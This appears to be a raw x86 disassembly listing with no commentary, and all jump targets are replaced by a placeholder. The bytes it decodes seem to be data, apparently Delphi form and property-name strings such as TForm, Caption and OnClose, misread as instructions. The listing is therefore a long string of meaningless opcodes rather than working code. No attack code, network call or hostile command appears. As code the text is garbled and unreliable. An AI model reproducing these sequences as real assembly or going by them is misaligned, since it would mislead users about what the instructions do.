inc esp
jae r-xdata
insd
inc esp
jae r-xdata
add [ eax ] al
add eax [ eax ]
add [ eax ] al
pushfd
and eax 0x64090046
inc esp
popa
jne r-xdata
outsd
arpl [ ecx + 0x4e ] sp
outsd
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
cmp al 0x26
inc esi
add [ ebx ] al
or al 0x54
inc ebx
insb
outsd
jae r-xdata
jae r-xdata
jo r-xdata
jb r-xdata
insb
jns r-xdata
jae r-xdata
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
outsd
jb r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] al
adc [ eax ] al
nop
or al 0x27
inc esi
add [ eax ] cl
push cs
push esp
push ebx
push 0x4374726f
jne r-xdata
jae r-xdata
outsb
je r-xdata
push ecx
jne r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
add [ eax ] al
add [ eax ] bh
inc esi
jb r-xdata
inc esi
outsd
jb r-xdata
add [ esi ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
cmp [ esi ] ah
inc esi
je r-xdata
inc ebp
jbe r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] bh
inc esi
add [ ebp + 0x26c80040 ] cl
inc esi
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
jb r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
add [ esi ] al
or al 0x54
shr ah 0x24
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
jl r-xdata
add [ esp + eax * 2 ] al
popad
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] al
push 0x3c004010
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x27ec0040 ] cl
add cl [ eax ]
push es
popad
outsb
add [ eax ] al
jb r-xdata
insd
outsd
add [ eax ] al
jae r-xdata
jb r-xdata
jo r-xdata
outsd
insb
popad
outsb
outsb
je r-xdata
outsd
outsd
insb
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
inc esi
jns r-xdata
add al dl
cmp eax [ ebp ]
or [ eax + 0x46 ] ah
inc esi
add ah cl
push ss
inc edx
add [ eax + ebx * 2 + 0x46 ] bh
add [ eax ] dh
pop edx
inc esi
pop es
dec ecx
outsb
je r-xdata
add [ edi + ecx * 4 ] ah
inc ecx
add [ eax + 0x5c ] bl
inc esi
add [ esp + ebx * 2 + 0x5da00046 ] dl
inc esi
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax ] bl
inc si
add [ eax - 0x47ffbded ] dh
mov eax [ 0x56f00046 ]
inc esi
add ah ah
inc ebp
add [ eax ] al
cmp al 0x45
add [ ebx + edi + 0x45 ] cl
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
clc
sar [ ebx ] 0x1
inc ebp
add [ eax ] cl
pushad
inc esi
inc esi
add al bh
add al [ eax ]
add [ ecx + 0x46 ] bh
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
sub [ esi ] al
test [ edx ] ch
inc esi
add [ eax ] al
add [ eax ] al
cmp al 0x10
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
in al dx
daa
jbe r-xdata
jo r-xdata
inc ebp
jbe r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
add [ ebx ] al
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
outsb
je r-xdata
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
bound eax [ esi ]
cwde
inc ebp
add al bl
mov edx 0xbadc0044
inc esp
add ah ch
arpl [ esi ] ax
jl r-xdata
inc esp
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax - 0x20 ] 0xac004665
inc esi
add [ eax ] cl
leave
inc esp
add [ eax + 0x66 ] bl
inc esi
add [ eax ] al
in al dx
inc esp
add ah ch
inc ebp
add [ eax - 0x5bffbad1 ] ch
sub al [ ebp ]
mov [ edi ] gs
inc ebp
add al dh
push ebp
inc esi
add ah bh
insb
inc esi
add [ eax + 0x5 ] bl
inc ebp
add al al
jns r-xdata
add [ esi + 0x7e9c0040 ] al
inc esi
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax - 0x2fffb9a6 ] bl
xor [ edx + 0x46 ] bl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ edx ] al
sub [ esi ] eax
jb r-xdata
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
adc [ eax ] al
dec eax
daa
inc esi
add [ eax ] cl
or dl [ eax + ecx * 2 + 0x65 ]
insb
outsb
je r-xdata
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
dec eax
popad
outsb
insb
pop es
inc edx
pop es
outsd
inc esi
add [ eax ] cl
or edx [ ebx + eax * 2 + 0x6c ]
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
jb r-xdata
lea eax [ eax ]
pushfd
and al 0x46
add [ ebx ] al
or edx [ edx + eax * 2 + 0x6f ]
inc esi
outsd
jb r-xdata
pop eax
inc esi
add [ ecx + ebx * 4 + 0x46 ] al
add [ eax ] ah
jge r-xdata
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
adc [ eax + 0x6f ] esi
push esp
and eax 0x9030046
jae r-xdata
add [ eax + eax * 4 ] ah
inc esi
add al bh
cdq
add ah bl
jpo r-xdata
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
0x65dc0046 0x46
push cs
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x23c0040 ] dl
add [ eax ] al
in al 0x23
inc esi
add [ eax + 0x2 ] dl
add [ eax ] al
sbb [ esi + eax * 2 ] ah
add [ edx + eax ] ah
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
add [ esi ] 0xf8
inc esi
add al dh
add eax 0x5f40045
inc ebp
add [ eax + 0x7e ] bl
inc esi
add [ esp + eax + 0x45 ] dl
add ah cl
xor [ ebp ] al
dec esp
test [ esi ] eax
rol [ edx + 0x45 ] 0x0
dec eax
sub eax 0x9a600045
inc esi
add ah ah
dec edi
inc esi
add [ edx + edx * 2 - 0x74bfffba ] dl
inc esi
add [ ebx + ebx * 2 + 0x46 ] bh
add al bh
pop ebx
inc esi
add [ eax - 0x62 ] al
inc esi
add [ eax + ebx * 2 - 0x66bbffba ] dh
sub_462bf8
sub al [ esi ]
sub [ edx ] 0x46
add [ esi ] bl
add eax 0x6d726f46
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] dl
jb r-xdata
add [ eax ] al
adc eax [ eax ]
or al [ ecx + 0x75 ]
je r-xdata
popad
inc edx
insb
outsb
push esp
adc [ eax ] al
loope r-xdata
outsb
je r-xdata
add [ eax + eax ] bh
add dh bh
sar [ ebx + 0x10044 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000d ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
and al 0x8b
inc esp
add [ eax ] ah
add al [ eax ]
inc [ eax ]
jg r-xdata
outsd
outsb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
sub [ ebx + 0x10046 ] ah
add [ eax ] al
add [ eax ] al
add [ eax + 0xff ] al
adc [ eax ] eax
cmovno ebp [ eax + esi * 2 + 0x68 ]
popad
inc edx
insb
outsb
push esi
popad
insb
jne r-xdata
add bh bh
ja r-xdata
sldt [ 0x67696c41 ]
outsb
add [ eax ] dl
inc eax
add al ah
add al [ eax ]
call [ ebx ]
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsd
insb
cld
outsd
inc esp
add [ ebx ] bl
add bh bh
pushad
mov ebp 0x10044
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
or al [ ecx + 0x6c ]
jo r-xdata
mov [ 0x10046 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4671 ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410d000e ] al
arpl [ ecx + ebp * 2 + 0x76 ] si
inc ebx
outsd
enter 0x44 0x80
jno r-xdata
and eax [ esi ]
sub [ edx ] eax
add bh bh
mov ah 0x6e
inc esi
add [ eax + 0x4671 ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
pop ss
add [ ebx ] cl
inc edx
outsd
je r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
cwde
leave
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080015 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xe865646f
and al 0x46
add [ eax ] ch
add al [ eax ]
dec [ eax - 0x7fffb992 ]
jno r-xdata
outsd
movsb [ edi ] [ esi ]
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ ecx + 0x75 ] al
je r-xdata
add [ ecx ] ah
add bh bh
mov al [ 0x3c0044bb ]
mov esp 0x44
add [ eax + 0x3 ] al
adc al [ eax ]
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
sub al 0x62
add [ eax ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ edx ] 0x0
or al 0x43
jb r-xdata
add [ edx ] ch
aam 0x64
insb
sbb al 0x86
inc esp
add [ ecx + eax ] ch
xor [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ eax ] al
or eax [ edx + 0x6f ]
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ edi ] 0x0
add [ eax ] al
push ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
mov [ esi + 0x46 ] ch
add [ eax + 0x4671 ] al
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
inc [ eax + 0x51 ]
inc esi
add [ edx + 0x46 ] ah
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
popad
outsb
jae r-xdata
and [ esi ] 0x42
add [ eax ] dh
add bh bh
adc al 0xca
inc esp
add [ eax ] dh
0x44
call 0x51452e5a
mov [ 0x10046 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb eax 0x72541000
popad
outsb
jae r-xdata
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40103c74
add [ eax - 0x3e ] bh
inc esp
add ah dl
inc esi
imul ebp [ edi + 0x6e ] r-xdata
mov esp 0x40044c2
inc esi
add [ edx ] ch
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c001a ] al
add [ 0x622c0046 ] al
add [ eax + 0x430b001b ] al
insb
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070019 ] al
popad
jo r-xdata
jb r-xdata
push ebp
jae r-xdata
popad
jb r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
popad
jb r-xdata
inc esi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
je r-xdata
jae r-xdata
arpl [ edi + 0x6e ] bp
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
and [ eax ] eax
push cs
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi + 0x4cff0001 ] ah
xor eax [ ebp ]
clc
outsb
je r-xdata
jb r-xdata
or eax [ edx + 0x6f ]
inc esp
add [ eax + ecx * 8 + 0x71800044 ] ah
inc esi
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ds
add [ ebx ] cl
inc ebx
and eax 0x2310046
add bh bh
xor [ edx ] eax
add bh bh
xor [ ecx + 0x46 ] 0x0
add [ eax ] al
add [ eax + 0x3 ] al
add [ eax ] al
add [ eax ] eax
outsd
insb
outsd
jb r-xdata
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
insb
outsd
jb r-xdata
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
xchg esp eax
sbb al 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
add [ gs : edi + 0x44 ] dh
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jb r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
add [ ebx + eax * 2 ] cl
inc edx
add ah ch
add al [ eax ]
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
add eax [ eax ]
add [ eax ] al
xor [ ebp ] eax
sbb al 0x32
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x700ffff ] ah
jbe r-xdata
outsd
outsb
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
dec esp
js r-xdata
inc eax
add [ ecx ] bl
add bh bh
mov al [ 0x10044c9 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
daa
add [ edx ] cl
push eax
popad
jb r-xdata
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x72440800
popad
adc [ eax ] al
cmpsd [ esi ] [ edi ]
add [ eax ] eax
dec [ ebx + esi + 0x45 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] dh
[ eax + 0x10044ed ]
add [ eax ] al
imul esp [ gs : edi + 0x68 ] 0x40109474
add [ edx + eax ] bh
outsb
je r-xdata
dec ecx
imul ebp [ ebp + 0x4c ] 0x800461f
add al [ eax ]
cmp al 0x10
outsd
outsb
je r-xdata
inc ebp
add [ eax + 0x2 ] ah
jb r-xdata
inc esi
sub eax [ edx ]
push 0x68ff0000
leave
inc esp
add [ eax - 0x37 ] bh
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040028 ] al
outsd
outsb
je r-xdata
cmp al 0x10
inc eax
add ah cl
je r-xdata
add [ eax + 0x4671 ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e002f ] al
bound ebp [ edx + 0x65 ]
add [ esi ] cl
dec edi
jbe r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ eax + 0x65 ] cl
insb
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub [ eax ] eax
or [ esi + 0x6f ] eax
jb r-xdata
add bh bh
cmp al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
cmp al 0x2
add [ edi ] ch
add al [ eax ]
push [ eax - 0x7fffb98f ]
jno r-xdata
and al 0x46
and eax 0x2300046
add bh bh
adc al 0x75
inc esi
add [ eax + 0x4671 ] al
add al ah
je r-xdata
js r-xdata
je r-xdata
arpl [ ebp + ecx * 2 + 0x65 ] si
outsb
jne r-xdata
ja r-xdata
insb
inc edx
popad
jb r-xdata
push ebx
je r-xdata
outsb
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor eax [ eax ]
or [ eax + 0x6f ] dl
jae r-xdata
add al [ eax ]
call [ esi * 2 + 0x71800046 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d0031 ] al
imul edi [ eax + 0x65 ] 0x6550736c
add [ eax ] al
add [ eax + eax ] dh
insb
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x50090032 ] al
outsd
jo r-xdata
insd
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor [ eax ] al
push cs
push eax
popad
jb r-xdata
inc ebx
rol [ ebp ] 0x48
add al [ eax ]
jb r-xdata
inc edx
add [ eax + 0x2 ] al
add bh bh
je r-xdata
arpl [ edi + 0x6e ] bp
add [ eax ] dl
inc eax
add [ 0x2dff0002 ] ch
add al [ eax ]
inc [ eax + 0x4671 ]
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub al 0x0
or cl [ ebx + 0x65 ]
jns r-xdata
add [ eax + 0x4671 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4904002b ] al
inc eax
add [ eax + eax ] cl
[ eax + eax * 8 ]
insb
cmp al 0x10
adc [ eax ] al
cdq
add [ eax ] al
push ebx
outsb
popad
jo r-xdata
outsd
outsb
outsb
arpl [ eax + 0x28 ] bp
les eax [ ebp ]
jl r-xdata
inc esp
leave
inc esp
add [ ecx + ecx * 8 + 0x44 ] cl
add [ eax - 0x80000000 ] al
aaa
add [ eax ] cl
push ebx
push 0x6948776f
outsb
je r-xdata
add [ esi * 2 + 0x71800046 ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor eax 0x63530600
popad
insb
add [ fs : eax ] dl
inc eax
add dl ah
add al [ eax ]
or dl [ eax + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
add [ gs : eax ] dl
add [ 0x35ff0002 ] dh
add al [ eax ]
inc [ eax + 0x4671 ]
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor al 0x0
jb r-xdata
jmp edx
jo r-xdata
add [ eax ] al
outsb
je r-xdata
popad
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ebx
arpl [ edx + 0x6f ] si
insb
add [ cs : esi ] cl
dec edi
insb
inc ebx
inc esi
or al 0x0
or eax 0x74726556
adc [ eax ] al
in al 0x2
add bh bh
in al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xa ] al
cmp [ eax ] al
or dl [ ebx + 0x6e ]
popad
jo r-xdata
add bh bh
sub al 0xc8
inc esp
add [ eax + 0x4671 ] al
add [ eax ] al
inc eax
add [ eax ] dh
jne r-xdata
outsb
jne r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x3c65646f
adc [ eax ] al
int3
add [ eax ] al
dec edi
jb r-xdata
adc [ eax ] al
push edi
add [ eax ] al
push [ 0xffffffffe9400046 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0x3c656c62
adc [ eax ] al
add [ eax ] al
add [ ecx ] bh
add [ edi ] al
jne r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or eax 0x65786950
jb r-xdata
add [ eax ] al
inc eax
add [ eax ] al
inc [ eax + 0x4671 ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003d ] al
je r-xdata
sub eax [ edx ]
add bh bh
sub al 0x76
inc esi
add [ eax + 0x4671 ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp al [ eax ]
or edx [ edi + 0x69 ]
outsb
outsd
ja r-xdata
add [ 0x74646957 ] al
push r-xdata
jb r-xdata
jb r-xdata
add bh bh
lodsb [ esi ]
jb r-xdata
mov esp 0x2600045
jne r-xdata
jpe r-xdata
popad
outsb
push edx
jae r-xdata
add [ eax ] al
cmp [ 0x6e4f0b00 ] 0x43
je r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050004 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
add [ eax ] cl
add bh bh
or al al
inc esp
add [ edx ] bh
pop ds
inc esi
add [ edx + eax ] cl
add bh bh
mov [ ecx + 0x46 ] ss
add [ eax + 0x4671 ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560d000c ] al
jb r-xdata
xor [ ecx + 0x46 ] 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ebx
add [ eax ] cl
dec edi
jb r-xdata
push ecx
mov ah 0x5a
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
outsb
inc ebx
dec edi
je r-xdata
add [ eax + 0x2 ] bl
add bh bh
shl [ edx + 0x46 ] 0x1
add [ eax + 0x4671 ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x570a003b ] al
imul ebp [ esi + 0x64 ] 0x654d776f
outsb
jne r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ edi + ecx * 2 ] cl
popad
mov ah 0x5a
movsb [ edi ] [ esi ]
jle r-xdata
dec eax
add [ eax ] al
dec [ eax ]
rol [ eax + eax + 0x3c ] 0x62
inc ebp
xor al 0x21
inc esi
add [ ebx ] ch
add al [ eax ]
[ esi + esi * 2 ]
pop edx
inc ecx
add [ eax - 0x7700fffe ] cl
add al [ eax ]
inc [ eax + 0x4671 ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003c ] al
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
dec edi
outsb
inc esp
jb r-xdata
clc
jpo r-xdata
outsb
inc esp
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
mov ah 0x5a
add [ esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
add al cl
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f130041 ] al
inc ebx
insb
outsd
jae r-xdata
xor al 0x7e
inc esp
add al al
add [ eax ] 0x0
add [ eax + 0x4f0d004c ] al
outsb
inc edi
je r-xdata
inc esp
jbe r-xdata
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0047 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
add [ eax + 0x4f090045 ] al
js r-xdata
outsb
inc esp
jae r-xdata
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
fadd [ edx ]
add bh bh
fadd [ edx ]
add bh bh
xor [ ecx + 0x46 ] 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ebp
add [ ecx ] cl
dec edi
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
les esp [ esi ]
inc esi
add [ eax - 0x6700fffe ] bl
add al [ eax ]
inc [ eax + 0x4671 ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0040 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
add bh bh
xor [ ecx + 0x46 ] 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
add [ ecx ] cl
dec edi
outsb
dec ebx
jns r-xdata
imul esi [ ebp + 0x49 ] 0xb46f666e
pop edx
inc ecx
add [ eax - 0x4f00fffe ] dh
add al [ eax ]
inc [ eax + 0x4671 ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06004d ] al
outsb
outsw
mov ah 0x5a
jo r-xdata
or [ edi + 0x6e ] ecx
jb r-xdata
jb r-xdata
jo r-xdata
hlt
jb r-xdata
add [ eax - 0x5f00fffe ] ah
add al [ eax ]
inc [ eax + 0x4671 ]
push eax
outsd
jo r-xdata
inc [ eax + 0x4671 ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0044 ] al
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
outsb
inc ebx
jb r-xdata
add al [ eax ]
inc [ eax + 0x4671 ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080043 ] al
push ecx
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
dec ecx
jpe r-xdata
inc esp
daa
inc esi
add [ eax - 0x5700fffe ] ch
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06004e ] al
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or cl [ edi + 0x6e ]
jpe r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec eax
add [ edx ] cl
dec edi
jpo r-xdata
or [ edx ] 0xa
dec edi
jl r-xdata
jns r-xdata
mov al [ 0xffffffff80ff0002 ]
jno r-xdata
jo r-xdata
loopne r-xdata
jo r-xdata
jns r-xdata
xor [ edx + 0x44 ] bh
add al ah
add [ eax ] eax
jmp eax
arpl [ ebx - 0x58 ] bp
jge r-xdata
outsb
inc esp
jb r-xdata
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ eax + 0x4671 ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a004a ] al
outsb
dec eax
insb
jo r-xdata
add bh bh
test al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec esi
add [ esi ] al
dec edi
jns r-xdata
jbe r-xdata
add al ch
add [ eax ] al
dec ecx
inc ebp
outsb
inc esp
outsd
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09004b ] al
outsb
outsb
dec eax
imul esp [ ebp + 0x44 ] 0xa8004627
add al [ eax ]
[ eax + 0x1ff0002 ]
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
jb r-xdata
outsb
add [ eax - 0x4700ffff ] bh
je r-xdata
pop edx
inc ecx
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0048 ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0046 ] al
add [ eax ] al
outsb
inc ebx
outsd
outsb
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ecx
add [ ebx ] dl
dec edi
pop edx
